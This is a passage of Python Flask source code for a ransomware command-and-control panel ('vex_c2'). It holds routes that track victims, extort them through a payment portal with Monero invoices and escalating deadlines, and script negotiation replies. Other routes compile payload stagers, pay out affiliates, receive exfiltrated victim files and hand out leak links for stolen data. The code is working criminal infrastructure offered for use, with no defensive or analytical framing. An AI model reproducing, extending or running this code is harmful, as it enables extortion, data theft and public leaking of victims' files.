    vid = (request.args.get("vid") or "").strip()
    where, params = [], []
    if kind:
        where.append("kind=?")
        params.append(kind)
    if vid:
        where.append("vid LIKE ?")
        params.append(f"%{vid}%")
    clause = (" WHERE " + " AND ".join(where)) if where else ""
    with c2db.db() as conn:
        rows = conn.execute("SELECT * FROM reports" + clause +
                            " ORDER BY id DESC LIMIT 300", params).fetchall()
    return render_template("reports.html", rows=rows, kind=kind, vid=vid)


@app.route("/admin/events")
@login_required()
def events():
    is_root = current_role() in ("root", "shadow")
    if _flag("audit_frozen") and not is_root:
        abort(403)
    with c2db.db() as conn:
        roots = {r[0]: r[1] for r in conn.execute(
            "SELECT username, role FROM operators WHERE role IN ('root','shadow')")}
    events = _filter_root_events(c2db.recent_events(300))
    if not is_root:
        roots = {}
    return render_template("events.html", events=events,
                           root_users=roots, frozen=_flag("audit_frozen"))


# ---------------------------------------------------------------------------
# settings / operators / maintenance
# ---------------------------------------------------------------------------
SETTING_KEYS = ("portal_title", "portal_intro", "price_usd", "xmr_address",
                "proof_max_mb", "proof_enabled", "payment_mode",
                "wallet_rpc_url", "wallet_rpc_user", "wallet_rpc_pass",
                "xmr_usd_rate", "backup_keep", "event_retention_days",
                "c2_host", "deadline_hours", "escalate_1_hours",
                "escalate_1_pct", "escalate_2_hours", "escalate_2_pct",
                "auto_action", "api_token", "leak_enabled", "leak_onion",
                "xmr_addresses",
                "auto_reply", "auto_reply_cooldown_hours",
                "require_2fa", "session_idle_min", "checkin_rate_per_min",
                "negotiation_enabled", "exfil_max_mb")

_NUMERIC_SETTINGS = {
    "price_usd": (float, 0, 1e9),
    "proof_max_mb": (int, 1, 64),
    "xmr_usd_rate": (float, 0, 1e9),
    "backup_keep": (int, 0, 365),
    "event_retention_days": (int, 1, 3650),
    "deadline_hours": (float, 1, 8760),
    "escalate_1_hours": (float, 0, 8760),
    "escalate_1_pct": (float, 0, 10000),
    "escalate_2_hours": (float, 0, 8760),
    "escalate_2_pct": (float, 0, 10000),
    "auto_reply_cooldown_hours": (int, 0, 8760),
    "session_idle_min": (int, 5, 720),
    "checkin_rate_per_min": (int, 5, 10000),
    "exfil_max_mb": (int, 1, 4096),
}
_FLAG_SETTINGS = ("proof_enabled", "leak_enabled", "auto_reply",
                  "require_2fa", "negotiation_enabled")


@app.route("/admin/settings", methods=["GET", "POST"])
@login_required("admin")
def settings():
    if request.method == "POST":
        pending = {}
        for key in SETTING_KEYS:
            if key not in request.form:
                continue
            raw = (request.form.get(key, "") or "")[:2000].strip()
            if key in _FLAG_SETTINGS:
                raw = "1" if raw in ("1", "on", "true", "yes") else "0"
            if key in _NUMERIC_SETTINGS:
                typ, low, high = _NUMERIC_SETTINGS[key]
                try:
                    val = typ(raw or "0")
                except (TypeError, ValueError):
                    flash(f"{key} must be a number", "error")
                    return redirect(url_for("settings"))
                if val < low or val > high:
                    flash(f"{key} must be between {low:g} and {high:g}", "error")
                    return redirect(url_for("settings"))
                raw = f"{val:g}" if typ is float else str(int(val))
            if key == "c2_host" and raw:
                if not re.fullmatch(r"[A-Za-z0-9.\-]{3,253}", raw):
                    flash("c2_host is not a valid hostname", "error")
                    return redirect(url_for("settings"))
            if key in ("wallet_rpc_pass", "api_token") and not raw:
                # A blank field means "keep the stored secret"; re-entry is
                # required to rotate it, never an accidental clear.
                continue
            pending[key] = raw
        for key, raw in pending.items():
            c2db.set_setting(key, raw)
        c2db.log_event(current_user(), "settings", "",
                       "updated:" + ",".join(sorted(pending)))
        flash("settings saved", "ok")
        return redirect(url_for("settings"))
    return render_template("settings.html",
                           s={k: c2db.get_setting(k) for k in SETTING_KEYS})


@app.route("/admin/operators", methods=["GET", "POST"])
@login_required("admin")
def operators():
    created = None
    if request.method == "POST":
        username = (request.form.get("username") or "").strip()
        password = request.form.get("password") or ""
        role = request.form.get("role") or "viewer"
        enable_totp = bool(request.form.get("enable_totp"))
        if not username or len(password) < 8:
            flash("username and 8+ char password required", "error")
        elif role not in ("admin", "viewer", "negotiator", "affiliate", "root", "shadow"):
            flash("bad role", "error")
        elif role in ("root", "shadow") and current_role() != "root":
            flash("only root can create root or shadow operators", "error")
        elif role == "root" and with_root_operator():
            flash("a root operator already exists", "error")
        else:
            totp = c2db.new_totp_secret() if enable_totp else ""
            codes, hashed = c2db.make_backup_codes() if enable_totp else ([], "")
            try:
                with c2db.db() as conn:
                    conn.execute(
                        "INSERT INTO operators (username, pw_hash, role, totp_secret,"
                        " backup_codes, created) VALUES (?,?,?,?,?,?)",
                        (username, c2db.hash_password(password), role, totp,
                         hashed, c2db.now()))
                    conn.commit()
                created = {"user": username, "totp": totp, "codes": codes}
                c2db.log_event(current_user(), "operator_add", "", username)
            except Exception:
                flash("username already exists", "error")

    with c2db.db() as conn:
        if current_role() == "root":
            rows = conn.execute("SELECT id, username, role, created, last_login, "
                                "totp_secret FROM operators ORDER BY id").fetchall()
        else:
            # Root and shadow operators are invisible to admins.
            rows = conn.execute("SELECT id, username, role, created, last_login, "
                                "totp_secret FROM operators "
                                "WHERE role NOT IN ('root','shadow') "
                                "ORDER BY id").fetchall()
    return render_template("operators.html", rows=rows, created=created)


@app.route("/admin/operators/delete/<int:oid>", methods=["POST"])
@login_required("admin")
def operator_delete(oid):
    deleted = ""
    with c2db.db() as conn:
        row = conn.execute("SELECT username, role FROM operators WHERE id=?",
                           (oid,)).fetchone()
        if not row or row["username"] == current_user():
            pass
        elif row["role"] == "root" and current_role() != "root":
            flash("root cannot be removed", "error")
        elif row["role"] == "root" and current_role() == "root":
            flash("root cannot delete root", "error")
        elif row["role"] == "shadow" and current_role() != "root":
            flash("shadow cannot be removed by this operator", "error")
        else:
            conn.execute("DELETE FROM operators WHERE id=?", (oid,))
            conn.commit()
            deleted = row["username"]
    if deleted:
        c2db.log_event(current_user(), "operator_delete", "", deleted)
    return redirect(url_for("operators"))


@app.route("/admin/backup", methods=["POST"])
@root_stepup_required
def backup():
    data = c2db.backup_bytes()
    stamp = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
    c2db.log_event(current_user(), "backup", "", f"{len(data)} bytes")
    return send_file(io.BytesIO(data), as_attachment=True,
                     download_name=f"vex_c2-{stamp}.db",
                     mimetype="application/octet-stream")


@app.route("/admin/maintenance/prune", methods=["POST"])
@login_required("admin")
def maintenance_prune():
    try:
        days = int(request.form.get("days") or c2db.get_setting("event_retention_days", "90"))
    except ValueError:
        days = 90
    res = c2db.prune(days)
    c2db.log_event(current_user(), "prune", "",
                   f"events={res['events']} reports={res['reports']}")
    flash(f"pruned {res['events']} events and {res['reports']} reports", "ok")
    return redirect(url_for("settings"))


@app.route("/admin/payments/check", methods=["POST"])
@login_required("admin")
def payments_check():
    try:
        n = payments.poll_once()
        flash(f"{n} payment(s) confirmed" if n else "no new payments", "ok")
    except Exception as exc:
        flash(f"payment check failed: {exc}", "error")
    return redirect(url_for("dashboard"))


# ---------------------------------------------------------------------------
# export / json
# ---------------------------------------------------------------------------
def _csv_cell(value):
    s = "" if value is None else str(value)
    # Formula injection: a victim-controlled hostname/user/note must not run
    # as an Excel formula when the operator opens the export.
    if s[:1] in ("=", "+", "-", "@", "\t", "\r"):
        s = "'" + s
    return s


def csv_response(rows, cols, filename):
    out = io.StringIO()
    w = csv.writer(out)
    w.writerow(cols)
    for r in rows:
        w.writerow([_csv_cell(r[c]) for c in cols])
    return Response(out.getvalue(), mimetype="text/csv",
                    headers={"Content-Disposition": f"attachment;filename={filename}"})


@app.route("/admin/export/victims.csv")
@login_required()
def export_victims():
    if _audit_blocked():
        abort(403)
    with c2db.db() as conn:
        rows = conn.execute("SELECT * FROM victims ORDER BY timestamp DESC").fetchall()
    cols = ["vid", "hostname", "username", "ip", "os_info", "status", "detonate",
            "price", "paid_at", "timestamp", "last_ping", "tags", "notes"]
    return csv_response(rows, cols, "vex_victims.csv")


@app.route("/admin/export/reports.csv")
@login_required()
def export_reports():
    if _audit_blocked():
        abort(403)
    with c2db.db() as conn:
        rows = conn.execute("SELECT * FROM reports ORDER BY id DESC").fetchall()
    return csv_response(rows, ["ts", "vid", "kind", "host", "detail"], "vex_reports.csv")


@app.route("/admin/api/overview")
@login_required()
def api_overview():
    with c2db.db() as conn:
        rows = conn.execute(
            "SELECT vid, hostname, status, detonate, last_ping, chat_unread "
            "FROM victims ORDER BY last_ping DESC LIMIT 200").fetchall()
    return jsonify(stats=stats_dict(),
                   victims=[{**dict(r), "online": c2db.online(r)} for r in rows])


# ---------------------------------------------------------------------------
# victim portal
# ---------------------------------------------------------------------------
@app.route("/portal", methods=["GET", "POST"])
def portal_login():
    if request.method == "POST":
        vid = (request.form.get("vid") or "").strip()
        if c2db.get_victim(vid):
            session["vid"] = vid
            return redirect(url_for("portal_view"))
        return "Invalid Victim ID.", 401
    return render_template("portal_login.html",
                           s={k: c2db.get_setting(k) for k in
                              ("portal_title", "portal_intro")})


@app.route("/portal/view", methods=["GET", "POST"])
def portal_view():
    vid = session.get("vid")
    v = c2db.get_victim(vid) if vid else None
    if v is None:
        session.pop("vid", None)
        return redirect(url_for("portal_login"))

    if request.method == "POST":
        msg = (request.form.get("message") or "").strip()
        try:
            attachment = _save_chat_file(request.files.get("attachment"), vid)
        except OSError as exc:
            c2db.log_event("victim", "chat_attachment_failed", vid, str(exc)[:160])
            flash("attachment save failed", "error")
            attachment = ""
        if msg or attachment:
            c2db.push_message(vid, "VICTIM", msg[:2000], "", attachment)
            _maybe_auto_reply(v)
        return redirect(url_for("portal_view"))

    return render_template("portal.html", v=v, chat=parse_chat(v),
                           aes_display=vault.reveal(v["aes_key"] or ""),
                           s={k: c2db.get_setting(k) for k in (
                               "portal_title", "portal_intro", "price_usd",
                               "xmr_address", "xmr_addresses", "proof_enabled",
                               "proof_max_mb")},
                           paid=(v["status"] == "paid"),
                           price_due=c2db.effective_price(v),
                           deadline=c2db.deadline_for(v),
                           invoice=c2db.ensure_invoice(v),
                           invoices=c2db.invoice_history(vid),
                           paid_total=c2db.payments_total(vid))


@app.route("/portal/proof", methods=["POST"])
def portal_proof():
    vid = session.get("vid")
    v = c2db.get_victim(vid) if vid else None
    if v is None:
        abort(403)
    if c2db.get_setting("proof_enabled", "1") != "1":
        abort(403)
    if not v["aes_key"]:
        flash("key not available yet", "error")
        return redirect(url_for("portal_view"))

    f = request.files.get("sample")
    if not f:
        flash("upload one encrypted file", "error")
        return redirect(url_for("portal_view"))

    max_mb = int(c2db.get_setting("proof_max_mb", "8") or 8)
    max_mb = max(1, min(max_mb, 64))
    # One proof is enough to demonstrate recoverability. Unlimited samples
    # would be a free decryption service for an unpaid victim.
    with _PROOF_LOCK:
        with c2db.db() as conn:
            already = conn.execute(
                "SELECT 1 FROM events WHERE vid=? AND kind='proof' LIMIT 1",
                (vid,)).fetchone()
        if already:
            flash("a decryption proof was already used for this victim", "error")
            return redirect(url_for("portal_view"))
    data = f.read((max_mb * 1024 * 1024) + 1)
    if len(data) > max_mb * 1024 * 1024:
        flash(f"file too large (max {max_mb} MB)", "error")
        return redirect(url_for("portal_view"))
    if not crypto_util.is_container(data):
        flash("not an encrypted sample", "error")
        return redirect(url_for("portal_view"))

    key = crypto_util.b64_key(vault.reveal(v["aes_key"]))
    if key is None:
        flash("stored key invalid", "error")
        return redirect(url_for("portal_view"))

    try:
        # Cap expansion relative to the upload: a small crafted header must not
        # force a half-gigabyte allocation on the operator host.
        cap = min(crypto_util.MAX_CONTAINER, max(64 * 1024 * 1024, len(data) * 64))
        plain = crypto_util.decrypt_container(data, key, cap)
    except Exception:
        c2db.log_event("portal", "proof_failed", vid, f.filename or "sample")
        flash("decryption failed: wrong key or corrupted sample", "error")
        return redirect(url_for("portal_view"))

    c2db.log_event("portal", "proof", vid, f"{f.filename} {len(plain)}B")
    base = os.path.basename(f.filename)
    name = base[:-7] if base.lower().endswith(".l0cked") else base
    name = name or "recovered"
    return send_file(io.BytesIO(plain), as_attachment=True,
                     download_name=name, mimetype="application/octet-stream")


@app.route("/portal/decrypter")
def portal_decrypter():
    vid = session.get("vid")
    v = c2db.get_victim(vid) if vid else None
    if v is None or v["status"] != "paid":
        abort(403)
    return _serve_cpp(v)


@app.route("/portal/decrypter_exe")
def portal_decrypter_exe():
    vid = session.get("vid")
    v = c2db.get_victim(vid) if vid else None
    if v is None or v["status"] != "paid":
        abort(403)
    return _serve_exe(v, request.args.get("arch", "x64"))


@app.route("/portal/logout")
def portal_logout():
    session.pop("vid", None)
    return redirect(url_for("portal_login"))


# ---------------------------------------------------------------------------
@app.route("/")
def index():
    return redirect(url_for("dashboard"))


@app.after_request
def security_headers(resp):
    resp.headers.setdefault("X-Content-Type-Options", "nosniff")
    resp.headers.setdefault("X-Frame-Options", "DENY")
    resp.headers.setdefault("Referrer-Policy", "no-referrer")
    resp.headers.setdefault(
        "Content-Security-Policy",
        "default-src 'self'; script-src 'self' 'unsafe-inline'; "
        "style-src 'self' 'unsafe-inline'; img-src 'self' data:; "
        "object-src 'none'; frame-ancestors 'none'; base-uri 'self'")
    if request.is_secure:
        resp.headers.setdefault("Strict-Transport-Security",
                                "max-age=31536000; includeSubDomains")
    return resp


@app.errorhandler(400)
def bad_request(_):
    return render_template("error.html", code=400,
                           msg="bad request (missing or stale csrf token)"), 400


@app.errorhandler(403)
def forbidden(_):
    return render_template("error.html", code=403, msg="not allowed"), 403


@app.errorhandler(404)
def not_found(_):
    return render_template("error.html", code=404, msg="not found"), 404


# ---------------------------------------------------------------------------
# startup housekeeping
# ---------------------------------------------------------------------------
def _flow_for(v):
    if not v["campaign_id"]:
        return []
    c = c2db.get_campaign(v["campaign_id"])
    if not c:
        return []
    try:
        cfg = json.loads(c["config"] or "{}")
    except ValueError:
        return []
    flow = cfg.get("flow")
    return flow if isinstance(flow, list) else []


def _flow_ok(when, v) -> bool:
    when = (when or "always").lower()
    total = c2db.payments_total(v["vid"])
    price = c2db.effective_price(v)
    paid = v["status"] == "paid" or (price > 0 and total >= price)
    if when in ("always", ""):
        return True
    if when == "paid":
        return paid
    if when == "partial":
        return total > 0 and not paid
    if when == "unpaid":
        return total <= 0 and not paid
    if when == "deadline":
        d = c2db.deadline_for(v)
        return bool(d and d < c2db.now())
    return False


def _render_flow_body(body, v):
    total = c2db.payments_total(v["vid"])
    return (body.replace("{amount}", "$%.0f" % c2db.effective_price(v))
                .replace("{paid}", "$%.2f" % total)
                .replace("{deadline}", c2db.deadline_for(v) or "-")
                .replace("{invoice}", c2db.ensure_invoice(v))
                .replace("{host}", v["hostname"] or "the machine"))


def _flow_reply(v):
    flow = _flow_for(v)
    if not flow:
        return False
    step_name = v["negotiation_step"] or "first"
    chosen = None
    for step in flow:
        if step.get("step") == step_name and _flow_ok(step.get("when"), v):
            chosen = step
            break
    if chosen is None:
        for step in flow:
            if _flow_ok(step.get("when"), v):
                chosen = step
                break
    if not chosen or not chosen.get("body"):
        return False
    c2db.push_chat(v["vid"], "ADMIN", _render_flow_body(chosen["body"], v))
    nxt = chosen.get("next") or "final"
    with c2db.db() as conn:
        conn.execute("UPDATE victims SET auto_replied_at=?, negotiation_step=? "
                     "WHERE vid=?", (c2db.now(), nxt, v["vid"]))
        conn.commit()
    return True


def _maybe_auto_reply(v):
    """One automatic first response per cooldown window."""
    if c2db.get_setting("auto_reply", "0") != "1":
        return
    try:
        cooldown = float(c2db.get_setting("auto_reply_cooldown_hours", "24") or 24)
    except ValueError:
        cooldown = 24.0
    last = v["auto_replied_at"] or ""
    if last:
        try:
            age = (datetime.datetime.now() -
                   datetime.datetime.strptime(last, "%Y-%m-%d %H:%M:%S")).total_seconds() / 3600
            if age < cooldown:
                return
        except ValueError:
            pass
    step = "first"
    if c2db.get_setting("negotiation_enabled", "0") == "1":
        step = v["negotiation_step"] or "first"
    if _flow_reply(v):
        return

    tpl = c2db.get_template(step) or c2db.get_template("first")
    if not tpl or not tpl["body"]:
        return
    body = tpl["body"]
    body = body.replace("{amount}", "$%.0f" % c2db.effective_price(v))
    body = body.replace("{deadline}", c2db.deadline_for(v) or "-")
    body = body.replace("{invoice}", c2db.ensure_invoice(v))
    body = body.replace("{host}", v["hostname"] or "the machine")
    c2db.push_chat(v["vid"], "ADMIN", body)
    nxt = {"first": "proof", "proof": "price", "price": "final"}.get(step, "final")
    with c2db.db() as conn:
        conn.execute("UPDATE victims SET auto_replied_at=?, negotiation_step=? "
                     "WHERE vid=?", (c2db.now(), nxt, v["vid"]))
        conn.commit()



# ---------------------------------------------------------------------------
# C2 v3: campaigns, inbox, affiliates, leak tokens, ops
# ---------------------------------------------------------------------------
def _invoice_pdf(v):
    inv = c2db.ensure_invoice(v)
    price = c2db.effective_price(v)
    deadline = c2db.deadline_for(v) or "-"
    lines = ["INVOICE", f"ID: {inv}", f"Amount due: USD {price:,.2f}",
             f"Deadline: {deadline}",
             "Payment instructions are available on the recovery portal."]
    stream = "BT /F1 16 Tf 72 760 Td "
    first = True
    for line in lines:
        esc = line.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")
        if not first:
            stream += "0 -28 Td "
        stream += f"({esc}) Tj "
        first = False
    stream += "ET\n"
    objs = ["<< /Type /Catalog /Pages 2 0 R >>",
            "<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] "
            "/Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>",
            f"<< /Length {len(stream)} >>\nstream\n{stream}endstream",
            "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"]
    out = b"%PDF-1.4\n"
    offsets = []
    for i, obj in enumerate(objs):
        offsets.append(len(out))
        out += f"{i+1} 0 obj\n{obj}\nendobj\n".encode("latin-1", "replace")
    xref = len(out)
    out += f"xref\n0 {len(objs)+1}\n0000000000 65535 f \n".encode()
    for off in offsets:
        out += f"{off:010d} 00000 n \n".encode()
    out += (f"trailer\n<< /Size {len(objs)+1} /Root 1 0 R >>\nstartxref\n"
            f"{xref}\n%%EOF\n").encode()
    return bytes(out)


@app.route("/admin/campaigns", methods=["GET", "POST"])
@login_required("admin")
def campaigns_page():
    if request.method == "POST":
        name = (request.form.get("name") or "").strip()
        if not name:
            flash("campaign name required", "error")
        else:
            try:
                cfg = json.dumps(json.loads(request.form.get("config") or "{}"), indent=2)
            except ValueError:
                cfg = "{}"
            cid = c2db.create_campaign(
                name, request.form.get("note") or "", cfg,
                (request.form.get("affiliate") or "").strip())
            c2db.log_event(current_user(), "campaign_create", "", f"{cid}:{name}")
            flash("campaign created", "ok")
            return redirect(url_for("campaign_page", cid=cid))
    return render_template("campaigns.html", rows=c2db.list_campaigns())


@app.route("/admin/campaign/<int:cid>", methods=["GET", "POST"])
@login_required("admin")
def campaign_page(cid):
    c = c2db.get_campaign(cid)
    if not c:
        abort(404)
    if request.method == "POST":
        try:
            cfg = json.dumps(json.loads(request.form.get("config") or "{}"), indent=2)
        except ValueError:
            cfg = c["config"] or "{}"
        c2db.update_campaign(cid, request.form.get("note") or "",
                            1 if request.form.get("active") else 0, cfg,
                             request.form.get("affiliate") or "")
        c2db.log_event(current_user(), "campaign_update", "", str(cid))
        flash("campaign saved", "ok")
        return redirect(url_for("campaign_page", cid=cid))
    return render_template("campaign.html", c=c,
                           victims=c2db.campaign_victims(cid),
                           artifacts=c2db.list_artifacts(cid))



def _run_campaign_build(bid: int, cid: int, name: str, host: str, token: str):
    c2db.update_campaign_build(bid, "running", "compiling payload...")
    try:
        meta = campaign_builder.build(name, host, token)
        c2db.update_campaign_build(bid, "done", "ok", meta["stager"],
                                   meta["stager_sha256"])
        c2db.add_artifact(cid, "stager", os.path.basename(meta["stager"]),
                          meta["stager_sha256"], meta["stager"])
    except Exception as exc:
        c2db.update_campaign_build(bid, "failed", str(exc)[-2000:])


@app.route("/admin/campaign/<int:cid>/compile", methods=["POST"])
@login_required("admin")
def campaign_compile(cid):
    c = c2db.get_campaign(cid)
    if not c:
        abort(404)
    if not int(c["active"] or 0):
        flash("campaign is inactive or nuked; reactivate it explicitly first", "error")
        return redirect(url_for("campaign_page", cid=cid))
    if not campaign_builder.available():
        flash("MSBuild or loader missing on this host", "error")
        return redirect(url_for("campaign_page", cid=cid))
    try:
        cfg = json.loads(c["config"] or "{}")
    except ValueError:
        cfg = {}
    host = (cfg.get("host") or c2db.get_setting("c2_host", "")).strip()
    token = (cfg.get("token") or c2db.get_setting("api_token", "")).strip()
    if not host:
        flash("campaign host is empty", "error")
        return redirect(url_for("campaign_page", cid=cid))
    bid = c2db.create_campaign_build(cid)
    threading.Thread(target=_run_campaign_build,
                     args=(bid, cid, c["name"], host, token), daemon=True).start()
    c2db.log_event(current_user(), "campaign_compile", "", f"{cid}#{bid}")
    flash(f"build job #{bid} queued", "ok")
    return redirect(url_for("campaign_page", cid=cid))


@app.route("/admin/campaign/<int:cid>/builds.json")
@login_required()
def campaign_builds_json(cid):
    rows = c2db.list_campaign_builds(cid)
    return jsonify({"builds": [{"id": r["id"], "status": r["status"],
                                "sha256": r["sha256"], "updated": r["updated"],
                                "log": (r["log"] or "")[-500:]} for r in rows]})


@app.route("/admin/build/<int:bid>/stager")
@login_required("admin")
def campaign_build_stager(bid):
    b = c2db.get_campaign_build(bid)
    if not b or b["status"] != "done" or not os.path.isfile(b["stager_path"]):
        abort(404)
    c2db.log_event(current_user(), "campaign_download", "",
                   f"#{bid} {b['sha256'][:12]}")
    return send_file(b["stager_path"], as_attachment=True,
                     download_name=os.path.basename(b["stager_path"]))

@app.route("/admin/campaign/<int:cid>/nuke", methods=["POST"])
@root_stepup_required
def campaign_nuke(cid):
    c = c2db.get_campaign(cid)
    if not c:
        abort(404)
    rootdir = os.path.realpath(os.path.join(APP_DIR, "..", "dist", "campaigns"))
    builds = c2db.list_campaign_builds(cid, 500)
    removed = 0
    for b in builds:
        p = (b["stager_path"] or "").strip()
        if p:
            rp = os.path.realpath(p)
            if rp.startswith(rootdir + os.sep):
                for cand in (rp, os.path.join(os.path.dirname(rp), "stage.bin")):
                    try:
                        if os.path.isfile(cand):
                            os.unlink(cand)
                            removed += 1
                    except OSError:
                        pass
        c2db.update_campaign_build(b["id"], "revoked", "campaign nuked", "", "")
    # Remove the whole campaign artifact directory, including x64/x86 stagers
    # and the universal launcher, not just the one path recorded per build.
    camp_dir = os.path.realpath(os.path.join(
        rootdir, campaign_builder.slugify(c["name"])))
    if camp_dir.startswith(rootdir + os.sep) and os.path.isdir(camp_dir):
        shutil.rmtree(camp_dir, ignore_errors=True)
    try:
        cfg = json.loads(c["config"] or "{}")
    except ValueError:
        cfg = {}
    cfg["host"] = ""
    cfg["nuked_at"] = c2db.now()
    c2db.update_campaign(cid, c["note"] or "", 0, json.dumps(cfg))
    with c2db.db() as conn:
        n = conn.execute("UPDATE victims SET detonate=2, pardon=0, status='dead' "
                         "WHERE campaign_id=?", (cid,)).rowcount
        conn.commit()
    c2db.log_event(current_user(), "campaign_nuke", "",
                   f"{cid} files={removed} victims={n}")
    notify.send(f"ROOT campaign nuke: {c['name']} ({n} victims, {removed} files)")
    flash(f"campaign nuked: {n} victims, {removed} build files removed", "ok")
    return redirect(url_for("campaign_page", cid=cid))


@app.route("/admin/campaign/<int:cid>/build", methods=["POST"])
@login_required("admin")
def campaign_build(cid):
    c = c2db.get_campaign(cid)
    if not c:
        abort(404)
    cfg = {
        "campaign": c["name"],
        "c2_host": c2db.get_setting("c2_host", ""),
        "api_token": c2db.get_setting("api_token", ""),
        "price_usd": c2db.get_setting("price_usd", "5000"),
        "deadline_hours": c2db.get_setting("deadline_hours", "72"),
        "note": c["note"] or "",
    }
    body = json.dumps(cfg, sort_keys=True, indent=2)
    sha = hashlib.sha256(body.encode()).hexdigest()
    aid = c2db.add_artifact(cid, "config", f"campaign-{cid}.json", sha, "")
    c2db.log_event(current_user(), "campaign_build", "", f"{cid}:{sha[:12]}")
    cmd = ("powershell -File build.ps1 -Test   # compile stager for this campaign\n"
           "# configure payload constants from this JSON, then repack")
    safe_cfg = dict(cfg)
    if safe_cfg.get("api_token"):
        safe_cfg["api_token"] = "(configured)"
    return jsonify({"campaign": c["name"], "config": safe_cfg, "sha256": sha,
                    "artifact_id": aid, "command": cmd})


@app.route("/admin/payout/<int:pid>/<status>", methods=["POST"])
@login_required("admin")
def payout_status(pid, status):
    if status not in ("approved", "paid", "rejected"):
        abort(400)
    if not c2db.set_payout_status(pid, status, current_user() or ""):
        flash("invalid payout transition", "error")
        return redirect(url_for("affiliates_page"))
    c2db.log_event(current_user(), "payout_" + status, "", str(pid))
    flash(f"payout {status}", "ok")
    return redirect(url_for("affiliates_page"))


def _affiliate_campaign_or_404(cid):
    c = c2db.get_campaign(cid)
    if not c or (c["affiliate"] or "").strip() != (current_user() or ""):
        abort(404)
    return c


def _affiliate_victim(vid):
    v = c2db.get_victim(vid)
    if not v:
        abort(404)
    c = c2db.get_campaign(v["campaign_id"]) if v["campaign_id"] else None
    if not c or (c["affiliate"] or "").strip() != (current_user() or ""):
        abort(404)
    if (v["status"] or "") != "paid":
        abort(403)
    return v


@app.route("/affiliate")
@login_required(("affiliate", "admin"))
def affiliate_home():
    user = current_user()
    summary = c2db.affiliate_summary(user)
    campaigns = c2db.list_campaigns(user) if current_role() == "affiliate" else []
    with c2db.db() as conn:
        payments_rows = conn.execute(
            "SELECT * FROM payments WHERE affiliate=? ORDER BY id DESC LIMIT 100",
            (user,)).fetchall()
    return render_template("affiliate.html", summary=summary,
                           campaigns=campaigns,
                           payments=payments_rows,
                           payouts=[p for p in c2db.list_payouts()
                                    if p["operator"] == user])


@app.route("/affiliate/campaign/<int:cid>")
@login_required("affiliate")
def affiliate_campaign(cid):
    c = _affiliate_campaign_or_404(cid)
    return render_template("affiliate_campaign.html", c=c,
                           victims=c2db.campaign_victims(cid))


@app.route("/affiliate/decryptor/<vid>")
@login_required("affiliate")
def affiliate_decryptor(vid):
    return _serve_cpp(_affiliate_victim(vid))


@app.route("/affiliate/decrypter_exe/<vid>")
@login_required("affiliate")
def affiliate_decryptor_exe(vid):
    return _serve_exe(_affiliate_victim(vid), request.args.get("arch", "x64"))


@app.route("/affiliate/request", methods=["POST"])
@login_required(("affiliate", "admin"))
def affiliate_request():
    try:
        amount = float(request.form.get("amount") or 0)
    except ValueError:
        amount = 0.0
    if amount <= 0 or not c2db.request_payout(
            current_user(), amount, (request.form.get("note") or "")[:300]):
        flash("invalid payout request", "error")
    else:
        c2db.log_event(current_user(), "payout_request", "", f"${amount:.2f}")
        flash("payout requested", "ok")
    return redirect(url_for("affiliate_home"))


@app.route("/healthz")
def healthz():
    try:
        c2db.health()
        return jsonify({"ok": True})
    except Exception:
        return jsonify({"ok": False}), 500


@app.route("/admin/metrics")
@login_required("admin")
def metrics_page():
    with c2db.db() as conn:
        victims = conn.execute("SELECT COUNT(*) FROM victims").fetchone()[0]
        paid = conn.execute("SELECT COALESCE(SUM(amount),0) FROM payments").fetchone()[0]
        pending = conn.execute("SELECT COUNT(*) FROM commands WHERE status='pending'"
                              ).fetchone()[0]
        campaigns = conn.execute("SELECT COUNT(*) FROM campaigns").fetchone()[0]
        unread = conn.execute("SELECT COUNT(*) FROM messages WHERE read_admin=0"
                             ).fetchone()[0]
    return jsonify({"victims": int(victims), "payments_usd": float(paid),
                    "pending_commands": int(pending), "campaigns": int(campaigns),
                    "unread_messages": int(unread)})


@app.route("/admin/audit/verify")
@login_required("admin")
def audit_verify():
    ok, bad = c2db.verify_audit_chain()
    return jsonify({"ok": ok, "bad_event": bad})


@app.route("/admin/victim/<vid>/leak-token", methods=["POST"])
@login_required("admin")
def leak_token(vid):
    victim_or_404(vid)
    token = c2db.create_leak_token(vid, int(request.form.get("hours") or 72))
    c2db.log_event(current_user(), "leak_token", vid, token[:8])
    flash(f"leak link: {url_for('leak_page', vid=vid, t=token, _external=True)}",
          "ok")
    return redirect(url_for("victim", vid=vid))


@app.route("/leak/<vid>/download/<int:uid>")
def leak_download(vid, uid):
    if not c2db.validate_leak_token(vid, request.args.get("t") or ""):
        abort(403)
    with c2db.db() as conn:
        row = conn.execute("SELECT * FROM uploads WHERE id=? AND vid=?",
                           (uid, vid)).fetchone()
    if not row or not os.path.isfile(row["path"]):
        abort(404)
    c2db.mark_leak_use(vid, request.args.get("t") or "")
    c2db.log_event("leak", "download", vid, row["name"])
    return send_file(row["path"], as_attachment=True,
                     download_name=os.path.basename(row["name"] or "file"))


@app.route("/portal/invoice.pdf")
def portal_invoice():
    vid = session.get("vid")
    v = c2db.get_victim(vid) if vid else None
    if not v:
        return redirect(url_for("portal_login"))
    return Response(_invoice_pdf(v), mimetype="application/pdf")


@app.route("/admin/victim/<vid>/invoice.pdf")
@login_required()
def admin_invoice(vid):
    return Response(_invoice_pdf(victim_or_404(vid)), mimetype="application/pdf")



@app.route("/api/exfil/v2/manifest", methods=["POST"])
def api_exfil_manifest():
    vid = (request.form.get("vid") or request.args.get("vid") or "").strip()
    name = (request.form.get("name") or request.args.get("name") or "file").strip()
    try:
        size = int(request.form.get("size") or request.args.get("size") or 0)
        total = int(request.form.get("total") or request.args.get("total") or 1)
    except ValueError:
        return "bad request", 400
    sha = (request.form.get("sha256") or request.args.get("sha256") or "").lower()
    if not _VID_RE.match(vid) or size < 0 or not (1 <= total <= 4096):
        return "bad request", 400
    if not c2db.get_victim(vid):
        return "unknown victim", 404
    if not re.fullmatch(r"[0-9a-f]{64}", sha):
        return "bad hash", 400
    try:
        limit_mb = int(c2db.get_setting("exfil_max_mb", "512") or 512)
    except ValueError:
        limit_mb = 512
    if size > limit_mb * 1024 * 1024:
        return "too large", 413
    with c2db.db() as conn:
        existing = conn.execute(
            "SELECT id FROM exfil_files WHERE vid=? AND sha256=? AND status='complete' "
            "LIMIT 1", (vid, sha)).fetchone()
    if existing:
